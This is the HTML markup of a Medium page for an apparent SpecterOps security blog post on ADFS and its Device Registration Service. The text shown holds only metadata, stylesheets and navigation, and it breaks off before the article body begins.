<!doctype html><html lang="en"><head><title data-rh="true">ADFS — Living in the Legacy of DRS | by Adam Chester | Jan, 2025 | Posts By SpecterOps Team Members</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2025-01-07T13:57:32.894Z"/><meta data-rh="true" name="title" content="ADFS — Living in the Legacy of DRS | by Adam Chester | Jan, 2025 | Posts By SpecterOps Team Members"/><meta data-rh="true" property="og:title" content="ADFS — Living in the Legacy of DRS"/><meta data-rh="true" property="al:android:url" content="medium://p/c11f9b371811"/><meta data-rh="true" property="al:ios:url" content="medium://p/c11f9b371811"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it, every bit of documentation I come across eventually explains…"/><meta data-rh="true" property="og:description" content="It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it…"/><meta data-rh="true" property="og:url" content="https://posts.specterops.io/adfs-living-in-the-legacy-of-drs-c11f9b371811"/><meta data-rh="true" property="al:web:url" content="https://posts.specterops.io/adfs-living-in-the-legacy-of-drs-c11f9b371811"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*31CEmkS9GO7ULoQSgVlnyg.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@xpnsec"/><meta data-rh="true" name="author" content="Adam Chester"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="ADFS — Living in the Legacy of DRS"/><meta data-rh="true" name="twitter:site" content="@specterops"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/c11f9b371811"/><meta data-rh="true" property="twitter:description" content="It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it…"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*31CEmkS9GO7ULoQSgVlnyg.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="22 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/resize:fill:256:256/1*D-FDlfkqivRBQZoESrwtqw.png"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@xpnsec"/><link data-rh="true" rel="canonical" href="https://posts.specterops.io/adfs-living-in-the-legacy-of-drs-c11f9b371811"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/c11f9b371811"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*31CEmkS9GO7ULoQSgVlnyg.png"],"url":"https:\u002F\u002Fposts.specterops.io\u002Fadfs-living-in-the-legacy-of-drs-c11f9b371811","dateCreated":"2025-01-07T13:57:32.894Z","datePublished":"2025-01-07T13:57:32.894Z","dateModified":"2025-01-07T14:33:37.877Z","headline":"ADFS — Living in the Legacy of DRS - Posts By SpecterOps Team Members","name":"ADFS — Living in the Legacy of DRS - Posts By SpecterOps Team Members","description":"It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it, every bit of documentation I come across eventually explains…","identifier":"c11f9b371811","author":{"@type":"Person","name":"Adam Chester","url":"https:\u002F\u002Fposts.specterops.io\u002F@xpnsec"},"creator":["Adam Chester"],"publisher":{"@type":"Organization","name":"Posts By SpecterOps Team Members","url":"posts.specterops.io","logo":{"@type":"ImageObject","width":149,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:298\u002F1*s-5BWBr8XsgtIU5azKNhZQ.jpeg"}},"mainEntityOfPage":"https:\u002F\u002Fposts.specterops.io\u002Fadfs-living-in-the-legacy-of-drs-c11f9b371811"}</script><style type="text/css" data-fela-rehydration="571" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="571" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:rgba(128, 128, 183, 1)}.es{border-color:rgba(128, 128, 183, 1)}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:rgba(128, 128, 183, 1)}.ez:disabled:hover{border-color:rgba(128, 128, 183, 1)}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-left:-12px}.ii{width:28px}.ij{height:28px}.ik{z-index:1}.il{width:24px}.im{margin-bottom:2px}.in{flex-wrap:nowrap}.io{font-size:16px}.ip{line-height:24px}.ir{margin:0 8px}.is{display:inline}.it{color:rgba(128, 128, 183, 1)}.iu{fill:rgba(128, 128, 183, 1)}.ix{flex:0 0 auto}.ja{flex-wrap:wrap}.jb{white-space:pre-wrap}.jc{margin-right:4px}.jd{overflow:hidden}.je{max-height:20px}.jf{text-overflow:ellipsis}.jg{display:-webkit-box}.jh{-webkit-line-clamp:1}.ji{-webkit-box-orient:vertical}.jj{word-break:break-all}.jl{padding-left:8px}.jm{padding-right:8px}.kn> *{flex-shrink:0}.ko{overflow-x:scroll}.kp::-webkit-scrollbar{display:none}.kq{scrollbar-width:none}.kr{-ms-overflow-style:none}.ks{width:74px}.kt{flex-direction:row}.ku{z-index:2}.kx{-webkit-user-select:none}.ky{border:0}.kz{fill:rgba(117, 117, 117, 1)}.lc{outline:0}.ld{user-select:none}.le> svg{pointer-events:none}.ln{cursor:progress}.lo{opacity:1}.lp{padding:4px 0}.ls{margin-top:0px}.lt{width:16px}.lv{display:inline-flex}.mb{max-width:100%}.mc{padding:8px 2px}.md svg{color:#6B6B6B}.mu{line-height:1.58}.mv{letter-spacing:-0.004em}.mw{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nr{margin-bottom:-0.46em}.ns{padding:2px 4px}.nt{font-size:75%}.nu> strong{font-family:inherit}.nv{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.nw{line-height:1.12}.nx{letter-spacing:-0.022em}.ny{font-weight:600}.ot{margin-bottom:-0.28em}.oz{text-decoration:underline}.pa{margin-left:auto}.pb{margin-right:auto}.pc{max-width:1256px}.pi{clear:both}.pk{cursor:zoom-in}.pl{z-index:auto}.pn{height:auto}.po{max-width:1438px}.pp{max-width:2048px}.pq{max-width:1424px}.pr{max-width:1422px}.ps{overflow-x:auto}.pt{padding:32px}.pu{border:1px solid #E5E5E5}.pv{line-height:1.4}.pw{margin-top:-0.2em}.px{margin-bottom:-0.2em}.py{white-space:pre}.pz{min-width:fit-content}.qa{max-width:1466px}.qb{max-width:1324px}.qc{max-width:1354px}.qd{max-width:1662px}.qe{max-width:974px}.qf{max-width:1022px}.qg{list-style-type:disc}.qh{margin-left:30px}.qi{padding-left:0px}.qo{max-width:998px}.qp{max-width:1712px}.qq{max-width:479px}.qr{max-width:1650px}.qs{max-width:2000px}.qt{max-width:672px}.qu{max-width:1170px}.qv{max-width:1370px}.qw{max-width:556px}.qx{max-width:940px}.qy{max-width:470px}.qz{max-width:2026px}.ra{max-width:1804px}.rb{max-width:630px}.rc{max-width:1698px}.rd{max-width:1758px}.re{max-width:1546px}.rf{list-style-type:decimal}.rg{max-width:960px}.rh{max-width:799px}.ri{max-width:976px}.rj{max-width:1306px}.rk{max-width:756px}.rl{margin-bottom:26px}.rm{margin-top:6px}.rn{margin-top:8px}.ro{margin-right:8px}.rp{padding:8px 16px}.rq{border-radius:100px}.rr{transition:background 300ms ease}.rt{white-space:nowrap}.ru{border-top:none}.rv{margin-bottom:50px}.rw{height:52px}.rx{max-height:52px}.ry{box-sizing:content-box}.rz{position:static}.sb{max-width:155px}.sh{margin-right:20px}.si{margin-bottom:64px}.sj{margin-bottom:48px}.sx{border-radius:2px}.sz{height:64px}.ta{width:64px}.tb{align-self:flex-end}.tc{color:rgba(255, 255, 255, 1)}.td{fill:rgba(255, 255, 255, 1)}.te{background:rgba(25, 25, 25, 1)}.tf{border-color:rgba(25, 25, 25, 1)}.ti:disabled{opacity:0.1}.tj:disabled:hover{background:rgba(25, 25, 25, 1)}.tk:disabled:hover{border-color:rgba(25, 25, 25, 1)}.tl{flex:1 1 auto}.tr{padding-right:4px}.ts{font-weight:500}.uf{margin-top:16px}.ug{margin-bottom:54px}.uh{height:0px}.ui{gap:18px}.uj{fill:rgba(61, 61, 61, 1)}.uv{border-bottom:solid 1px #E5E5E5}.uw{margin-top:72px}.ux{padding:24px 0}.uy{margin-bottom:0px}.uz{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:rgba(110, 110, 154, 1)}.eu:hover{border-color:rgba(110, 110, 154, 1)}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.iq:hover{text-decoration:underline}.iv:hover:not(:disabled){color:rgba(110, 110, 154, 1)}.iw:hover:not(:disabled){fill:rgba(110, 110, 154, 1)}.lb:hover{fill:rgba(8, 8, 8, 1)}.lq:hover{fill:#000000}.lr:hover p{color:#000000}.lu:hover{color:#000000}.me:hover svg{color:#000000}.rs:hover{background-color:#F2F2F2}.sy:hover{background-color:none}.tg:hover{background:#000000}.th:hover{border-color:#242424}.uk:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.la:focus{fill:rgba(8, 8, 8, 1)}.mf:focus svg{color:#000000}.pm:focus{transform:scale(1.01)}.lf:active{border-style:none}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jz{border-top:solid 1px #F2F2F2}.ka{border-bottom:solid 1px #F2F2F2}.kb{margin:32px 0 0}.kc{padding:3px 8px}.kl> *{margin-right:24px}.km> :last-child{margin-right:0}.lm{margin-top:0px}.ma{margin:0}.nn{font-size:20px}.no{margin-top:2.14em}.np{line-height:32px}.nq{letter-spacing:-0.003em}.op{font-size:24px}.oq{margin-top:1.95em}.or{line-height:30px}.os{letter-spacing:-0.016em}.oy{margin-top:0.94em}.ph{margin-top:56px}.qn{margin-top:1.14em}.sg{display:inline-block}.sk{flex-direction:row}.sn{margin-bottom:0}.so{margin-right:20px}.tm{max-width:500px}.ud{line-height:24px}.ue{letter-spacing:0}.up{margin:40px 0 0}.uu{padding-top:72px}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ll{margin-top:0px}.sf{display:inline-block}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lk{margin-top:0px}.se{display:inline-block}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.li{margin-top:0px}.lj{margin-right:0px}.sd{display:inline-block}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.iy{flex-direction:column}.jn{margin:24px -24px 0}.jo{padding:0}.kd> *{margin-right:8px}.ke> :last-child{margin-right:24px}.kv{margin-left:0px}.lg{margin-top:0px}.lh{margin-right:0px}.lw{margin:0}.mg{border:1px solid #F2F2F2}.mh{border-radius:99em}.mi{padding:0px 16px 0px 12px}.mj{height:38px}.mk{align-items:center}.mm svg{margin-right:8px}.mx{font-size:18px}.my{margin-top:1.56em}.mz{line-height:28px}.na{letter-spacing:-0.003em}.nz{font-size:20px}.oa{margin-top:1.2em}.ob{line-height:24px}.oc{letter-spacing:0}.ou{margin-top:0.67em}.pd{margin-top:40px}.qj{margin-top:1.34em}.sc{display:inline-block}.sv{margin-bottom:20px}.sw{margin-right:0}.tq{max-width:100%}.tt{font-size:24px}.tu{line-height:30px}.tv{letter-spacing:-0.016em}.ul{margin:32px 0 0}.uq{padding-top:48px}.ml:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jv{border-top:solid 1px #F2F2F2}.jw{border-bottom:solid 1px #F2F2F2}.jx{margin:32px 0 0}.jy{padding:3px 8px}.kj> *{margin-right:24px}.kk> :last-child{margin-right:0}.lz{margin:0}.nj{font-size:20px}.nk{margin-top:2.14em}.nl{line-height:32px}.nm{letter-spacing:-0.003em}.ol{font-size:24px}.om{margin-top:1.95em}.on{line-height:30px}.oo{letter-spacing:-0.016em}.ox{margin-top:0.94em}.pg{margin-top:56px}.qm{margin-top:1.14em}.sl{flex-direction:row}.sp{margin-bottom:0}.sq{margin-right:20px}.tn{max-width:500px}.ub{line-height:24px}.uc{letter-spacing:0}.uo{margin:40px 0 0}.ut{padding-top:72px}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jr{border-top:solid 1px #F2F2F2}.js{border-bottom:solid 1px #F2F2F2}.jt{margin:32px 0 0}.ju{padding:3px 8px}.kh> *{margin-right:24px}.ki> :last-child{margin-right:0}.ly{margin:0}.nf{font-size:20px}.ng{margin-top:2.14em}.nh{line-height:32px}.ni{letter-spacing:-0.003em}.oh{font-size:24px}.oi{margin-top:1.95em}.oj{line-height:30px}.ok{letter-spacing:-0.016em}.ow{margin-top:0.94em}.pf{margin-top:56px}.ql{margin-top:1.14em}.sm{flex-direction:row}.sr{margin-bottom:0}.ss{margin-right:20px}.to{max-width:500px}.tz{line-height:24px}.ua{letter-spacing:0}.un{margin:40px 0 0}.us{padding-top:72px}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iz{flex-direction:column}.jp{margin:24px 0 0}.jq{padding:0}.kf> *{margin-right:8px}.kg> :last-child{margin-right:8px}.kw{margin-left:0px}.lx{margin:0}.mn{border:1px solid #F2F2F2}.mo{border-radius:99em}.mp{padding:0px 16px 0px 12px}.mq{height:38px}.mr{align-items:center}.mt svg{margin-right:8px}.nb{font-size:18px}.nc{margin-top:1.56em}.nd{line-height:28px}.ne{letter-spacing:-0.003em}.od{font-size:20px}.oe{margin-top:1.2em}.of{line-height:24px}.og{letter-spacing:0}.ov{margin-top:0.67em}.pe{margin-top:40px}.qk{margin-top:1.34em}.st{margin-bottom:20px}.su{margin-right:0}.tp{max-width:100%}.tw{font-size:24px}.tx{line-height:30px}.ty{letter-spacing:-0.016em}.um{margin:32px 0 0}.ur{padding-top:48px}.ms:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="print">.sa{display:none}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.jk{max-height:none}</style><style type="text/css" data-fela-rehydration="571" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.pj{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fc11f9b371811&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderCollection&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 